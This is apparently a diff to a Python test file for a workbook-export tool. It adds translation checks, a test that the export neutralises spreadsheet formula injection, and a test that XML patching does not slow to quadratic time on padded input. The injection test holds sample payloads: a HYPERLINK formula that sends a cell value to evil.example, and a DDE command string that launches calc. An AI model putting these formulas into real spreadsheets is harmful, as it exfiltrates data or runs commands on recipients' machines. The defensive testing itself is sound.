@@ -94,7 +94,9 @@ def test_labels_complete_and_messages_translated():
                              "(the workbook has no DSCR covenant test).", "fr").startswith("Le DSCR dérivé descend à 0.37x")
     assert translate_message("lots.0.included: Included flag must be 0 or 1.; debt.sizing_method: Must be 'Gearing' or 'DSCR'.",
                              "fr") == ("lots.0.included: L'indicateur « inclus » doit valoir 0 ou 1.; "
-                                       "debt.sizing_method: Valeur attendue : 'Gearing' or 'DSCR'.")
+                                       "debt.sizing_method: Valeur attendue : « Gearing » ou « DSCR ».")
+    assert translate_message("Derived DSCR falls to -0.25x in a repayment year, below the 1.20x target "
+                             "(the workbook has no DSCR covenant test).", "fr").startswith("Le DSCR dérivé descend à -0.25x")
     assert translate_message("Something new.", "fr") == "Something new."
 
 
@@ -145,3 +147,27 @@ def test_crossboundary_fill_refuses_basis_change():
         fill_template(WORKBOOK.read_bytes(), a, {})
     assert any("currency.tariff" in p for p in e.value.problems)
 
+
+
+def test_studio_export_neutralises_formula_injection_and_control_characters(demo):
+    a = json.loads(json.dumps(demo["version"]["assumptions"]))
+    a["lots"][0]["name"] = '=HYPERLINK("http://evil.example/?"&C2,"open")'
+    a["lots"][1]["country"] = "+cmd"
+    data = build_studio_workbook(project={"name": "=cmd|' /C calc'!A0", "country": "F\x01"},
+                                 version={**demo["version"], "assumptions": a}, run=demo["run"], lang="en")
+    wb = openpyxl.load_workbook(io.BytesIO(data))
+    assert wb["ReadMe"]["B3"].data_type == "s" and wb["ReadMe"]["B4"].value == "F"
+    assert wb["Lots"]["C1"].data_type == "s"
+    assert all(c.data_type != "f" for row in wb["Lots"].iter_rows() for c in row)
+    assert wb["KPIs"]["G2"].data_type == "f"          # the audit formulas themselves stay formulas
+
+
+def test_patch_sheet_is_linear_on_padded_xml():
+    """A sheet padded with '<c ' text (e.g. in a comment) must not make the patch quadratic."""
+    import time
+    pad = "<!--" + "<c " * 200_000 + "-->"
+    xml = pad + '<sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData>'
+    t0 = time.perf_counter()
+    out = _patch_sheet(xml, {f"A{i}": 1 for i in range(1, 200)}, "S", [])
+    assert time.perf_counter() - t0 < 5
+    assert '<c r="A1"><v>1</v></c>' in out
